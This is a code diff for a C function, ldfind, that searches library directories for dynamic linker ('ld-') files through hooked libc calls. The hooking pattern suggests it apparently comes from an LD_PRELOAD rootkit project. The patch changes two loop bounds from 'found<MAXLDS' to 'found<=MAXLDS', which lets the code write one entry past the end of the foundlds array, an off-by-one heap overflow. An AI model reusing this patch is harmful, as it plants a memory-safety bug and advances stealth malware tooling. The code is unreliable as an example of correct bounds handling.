@@ -6,19 +6,20 @@ char **ldfind(int *allf){
     struct dirent *dir;
     DIR *dp;
     struct stat sbuf;
+    size_t pathsize;
 
     char **foundlds = malloc(sizeof(char*)*MAXLDS);
     if(!foundlds) return NULL;
 
     hook(COPENDIR, CREADDIR, C__LXSTAT);
 
-    for(int i=0; i<sizeofarr(ldhomes) && found<MAXLDS; i++){
+    for(int i=0; i<sizeofarr(ldhomes) && found<=MAXLDS; i++){
         home = ldhomes[i];
         
         dp = call(COPENDIR, home);
         if(dp == NULL) continue;
 
-        while((dir = call(CREADDIR, dp)) != NULL && found<MAXLDS){
+        while((dir = call(CREADDIR, dp)) != NULL && found<=MAXLDS){
             if(!strncmp(".", dir->d_name, 1) || strncmp("ld-", dir->d_name, 3))
                 continue;
 
@@ -38,15 +39,16 @@ char **ldfind(int *allf){
                 continue;
             else isanld = 0;
 
-            char path[strlen(home)+strlen(ldname)+2];
+            pathsize = strlen(home)+strlen(ldname)+2;
+            char path[pathsize];
             snprintf(path, sizeof(path), "%s/%s", home, ldname);
 
             memset(&sbuf, 0, sizeof(struct stat));
             if((long)call(C__LXSTAT, _STAT_VER, path, &sbuf) < 0 || S_ISLNK(sbuf.st_mode))
                 continue;
 
-            foundlds[found] = malloc(PATH_MAX+1);
-            strncpy(foundlds[found++], path, PATH_MAX);
+            foundlds[found] = malloc(pathsize);
+            strncpy(foundlds[found++], path, pathsize);
         }
 
         closedir(dp);
